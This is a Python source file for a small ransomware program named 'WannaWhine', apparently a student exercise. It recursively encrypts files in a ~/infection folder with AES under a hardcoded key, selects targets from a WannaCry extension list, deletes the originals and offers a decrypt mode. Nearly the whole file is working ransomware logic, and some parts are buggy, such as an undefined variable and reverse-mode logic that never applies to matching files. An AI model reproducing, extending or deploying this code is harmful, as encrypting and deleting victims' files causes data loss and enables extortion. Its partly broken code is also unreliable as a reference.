import argparse
import os
from Crypto.Cipher import AES #pip
from Crypto import Random

RANSOM = os.environ["HOME"] + '/infection/'
KEY = 'v8y/B?E(H+MbQeTh'

def parse_args():
	parser = argparse.ArgumentParser(prog='WannaWhine', description='Small Ransomware', epilog='Do evil for educational purposes. Made by: cruiz-de')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0', help='Displays programs version number.')
	parser.add_argument('-r', '--reverse', action='store_true', help='Decreypts the encrypted files.')
	parser.add_argument('-s', '--silent', action='store_true', help='Silent mode.')
	args = parser.parse_args()
	return args

def check_infection() -> bool:
	if os.path.isdir('/home/' + os.getlogin() + '/infection'):
		return True
	else:
		return False

def check_file_extension(file):
	with open('wannacry_file_extensions.txt', 'r') as ext:
		for line in ext.readlines():
			if file.endswith(line.strip()):
				return True
		return False

#def loop_file(args):
#	for root, dirs, files in os.walk(RANSOM):
#		for filename in files:
#			fullPath = os.path.join(RANSOM, filename)
#			allFiles.append(fullPath)
#			print(fullPath)
#			if check_file_extension(filename):
#				if args.reverse:
#					decrypt_files(filename)
#				else:
#					pass
#					#encrypt_files(filename)
#			else:
#				print('[-] ' + filename + ' not encrypted.')

def loop_file(args):
	files = getListOfFiles(RANSOM)
	for file in files:
		if check_file_extension(file):
			encrypt_files(file)
		elif args.reverse:
			decrypt_files(file)
		else:
			print('[-] ' + file + ' not encrypted.')

def getListOfFiles(dirName):
    # create a list of file and sub directories 
    # names in the given directory 
    listOfFile = os.listdir(dirName)
    allFiles = list()
    # Iterate over all the entries
    for entry in listOfFile:
        # Create full path
        fullPath = os.path.join(dirName, entry)
        # If entry is a directory then get the list of files in this directory 
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)
                
    return allFiles

def caca():
	files = getListOfFiles(path)
	for file in files:
		encrypt(file)

def padding(data):
	return data+b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt(files):
	files = padding(files)
	initialization_vector = Random.new().read(AES.block_size)
	cipher = AES.new(KEY, AES.MODE_CBC, initialization_vector)
	return initialization_vector + cipher.encrypt(files)

def encrypt_files(file_name):
	with open(file_name, 'rb') as open_f:
		text = open_f.read()
	encryption = encrypt(text)
	with open(file_name + '.ft', 'wb') as open_f:
		open_f.write(encryption)
	os.remove(file_name)
	print('[+] ' + file_name + ' encrypted.')

def decrypt(ciphered):
	initialization_vector = ciphered[:AES.block_size]
	cipher = AES.new(KEY, AES.MODE_CBC, initialization_vector)
	text = cipher.decrypt(ciphered[AES.block_size:])
	return text.rstrip(b"\0")

def decrypt_files(file_name):
	with open(file_name, 'rb') as open_f:
		text = open_f.read()
	decryption = decrypt(text)
	with open(file_name[:-4], 'wb') as open_f:
		open_f.write(decryption)
	os.remove(file_name)
	print('[+] ' + file_name + ' decrypted.')


if __name__ == '__main__':
	args = parse_args()
	if check_infection():
		loop_file(args)
			#print(getListOfFiles(RANSOM))